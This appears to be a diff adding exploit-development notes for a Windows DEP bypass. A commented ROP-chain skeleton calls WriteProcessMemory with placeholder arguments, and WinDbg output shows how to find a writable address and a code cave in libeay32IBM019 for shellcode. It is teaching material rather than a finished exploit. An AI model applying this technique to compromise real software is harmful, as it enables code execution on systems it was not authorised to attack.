@@ -1,0 +1,86 @@
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+
+=======
+
+skeleton  = RopChain()
+# skeleton += 0x41414141                # WriteProcessMemory address
+# skeleton += 0x42424242                # shellcode return address to return to after WriteProcessMemory is called
+# skeleton += 0xffffffff                # hProcess (pseudo Process handle)
+# skeleton += 0x44444444                # lpBaseAddress (Code cave address)
+# skeleton += 0x45454545                # lpBuffer (shellcode address)
+# skeleton += 0x46464646                # nSize (size of shellcode)
+# skeleton += 0x47474747                # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE)
+
+in case of non ASLR module:
+
+0x42424242, 0x44444444, 0x47474747 are predefined
+-----------------------------------------------------------------
+for 0x47474747 you should find writeable address in any module:
+Example:
+
+0:077> !dh -a libeay32IBM019
+File Type: DLL
+FILE HEADER VALUES
+     14C machine (i386)
+       6 number of sections
+49EC08E6 time date stamp Sun Apr 19 22:32:22 2009
+       0 file pointer to symbol table
+       0 number of symbols
+      E0 size of optional header
+    2102 characteristics
+            Executable
+            32 bit word machine
+            DLL
+...
+SECTION HEADER #4
+   .data name
+    F018 virtual size <- BINGO
+   D5000 virtual address <- BINGO
+    CA00 size of raw data
+   D2000 file pointer to raw data
+       0 file pointer to relocation table
+       0 file pointer to line numbers
+       0 number of relocations
+       0 number of line numbers
+C0000040 flags
+         Initialized Data
+         (no align specified)
+         Read Write <- COOL!
+
+Find absolute address 4 bytes after end of section:
+0:077> ? libeay32IBM019 + D5000 + F018  + 4
+Evaluate expression: 53297180 = 032d401c
+
+
+See what's there:
+0:077> dd 032d401c
+032d401c  00000000 00000000 00000000 00000000
+032d402c  00000000 00000000 00000000 00000000
+032d403c  00000000 00000000 00000000 00000000
+032d404c  00000000 00000000 00000000 00000000
+032d405c  00000000 00000000 00000000 00000000
+032d406c  00000000 00000000 00000000 00000000
+032d407c  00000000 00000000 00000000 00000000
+032d408c  00000000 00000000 00000000 00000000
+
+Check protections:
+0:077> !vprot 032d401c
+BaseAddress:       032d4000
+AllocationBase:    031f0000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE <- YAY!
+Type:              01000000  MEM_IMAGE
+
+So instead of 0x47474747 you can write 0x032d401c in the skeleton.
+----------------------------------------------------------------------
+0x42424242, 0x44444444 you should find a code cave (.text section 0 bytes)
+
+you can you the above technique to find code cave in the .TEXT section.
